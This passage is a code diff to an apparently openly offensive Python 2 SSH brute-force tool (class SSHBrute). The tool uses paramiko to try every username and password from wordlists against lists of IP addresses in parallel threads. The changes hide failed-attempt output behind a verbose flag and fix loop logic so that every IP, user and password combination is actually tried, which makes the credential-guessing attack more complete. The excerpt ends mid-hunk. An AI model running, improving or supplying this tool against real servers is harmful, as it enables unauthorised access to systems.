@@ -34,8 +34,9 @@ class SSHBrute:
             return True
         except paramiko.AuthenticationException:
             ssh.close()
-            sys.stdout.write("Faild %s %s/%s                       \n" % (ip, usr, pwd))
-            sys.stdout.flush()
+            if self.args.verbose:
+                sys.stdout.write("Faild %s %s/%s                       \n" % (ip, usr, pwd))
+                sys.stdout.flush()
             return False
         except paramiko.ssh_exception.NoValidConnectionsError:
             ssh.close()
@@ -79,59 +80,63 @@ class SSHBrute:
         else:
             self.args.thread=int(self.args.thread)
         if self.args.iplist:
-            with open(self.args.iplist) as iplist:
-                if self.args.userlist:
+            if self.args.userlist:
+                if self.args.passlist:#iplist userlist passlist
                     with open(self.args.userlist) as userlist:
-                        if self.args.passlist:#iplist userlist passlist
+                        for usr in userlist.readlines():
+                            usr = usr.strip()
                             with open(self.args.passlist) as passlist:
-                                for usr in userlist.readlines():
-                                    usr=usr.strip()
-                                    for pwd in passlist.readlines():
-                                        pwd=pwd.strip()
+                                for pwd in passlist.readlines():
+                                    pwd=pwd.strip()
+                                    with open(self.args.iplist) as iplist:
                                         for ip in iplist.readlines():
                                             ip=ip.strip()
                                             self.start_thread(ip,usr,pwd)
-                        elif self.args.password: #iplist userlist singlepass
-                            for usr in userlist.readlines():
-                                usr = usr.strip()
+                elif self.args.password: #iplist userlist singlepass
+                    with open(self.args.userlist) as userlist:
+                        for usr in userlist.readlines():
+                            usr = usr.strip()
+                            with open(self.args.iplist) as iplist:
                                 for ip in iplist.readlines():
                                     ip = ip.strip()
                                     self.start_thread(ip, usr, self.args.password)
-                        else:
-                            print 'Too few arguments'
-
-                elif self.args.username:
-                    if self.args.passlist: #iplist singleuser passlist
-                        with open(self.args.passlist) as passlist:
-                            for pwd in passlist.readlines():
-                                pwd = pwd.strip()
+                else:
+                    print 'Too few arguments'
+            elif self.args.username:
+                if self.args.passlist: #iplist singleuser passlist
+                    with open(self.args.passlist) as passlist:
+                        for pwd in passlist.readlines():
+                            pwd = pwd.strip()
+                            with open(self.args.iplist) as iplist:
                                 for ip in iplist.readlines():
                                     ip = ip.strip()
                                     self.start_thread(ip, self.args.username, pwd)
-                    elif self.args.password: #iplist singleuser singlepass
+                elif self.args.password: #iplist singleuser singlepass
+                    with open(self.args.iplist) as iplist:
                         for ip in iplist.readlines():
                             ip = ip.strip()
                             self.start_thread(ip, self.args.username, self.args.password)
-                    else:
-                        print 'Too few arguments'
                 else:
                     print 'Too few arguments'
+            else:
+                print 'Too few arguments'
         elif self.args.ip:
             if self.args.userlist:
-                with open(self.args.userlist) as userlist:
-                    if self.args.passlist:  # singleip userlist passlist
-                        with open(self.args.passlist) as passlist:
-                            for usr in userlist.readlines():
-                                usr = usr.strip()
+                if self.args.passlist:  # singleip userlist passlist
+                    with open(self.args.userlist) as userlist:
+                        for usr in userlist.readlines():
+                            usr = usr.strip()
+                            with open(self.args.passlist) as passlist:
                                 for pwd in passlist.readlines():
                                     pwd = pwd.strip()
                                     self.start_thread(self.args.ip, usr, pwd)
-                    elif self.args.password: #singleip userlist singleip
+                elif self.args.password: #singleip userlist singleip
+                    with open(self.args.userlist) as userlist:
                         for usr in userlist.readlines():
                             usr = usr.strip()
                             self.start_thread(self.args.ip, usr, self.args.password)
-                    else:
-                        print 'Too few arguments'
+                else:
+                    print 'Too few arguments'
             elif self.args.username:
                 if self.args.passlist:  # singleip singleuser passlist
                     with open(self.args.passlist) as passlist:
